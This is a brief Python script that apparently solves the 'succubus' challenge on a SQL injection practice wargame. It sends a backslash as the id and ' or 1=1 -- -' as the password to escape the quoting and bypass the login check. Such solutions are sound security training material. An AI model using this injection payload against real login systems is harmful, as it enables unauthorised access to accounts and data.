from constants import *

chall_url = "https://los.rubiya.kr/chall/succubus_37568a99f12e6bd2f097e8038f74d768.php"

res = make_request(chall_url, "?id=" + urllib.parse.quote("\\") + "&pw=" + urllib.parse.quote(" or 1=1 -- -"))
check_clear(res)
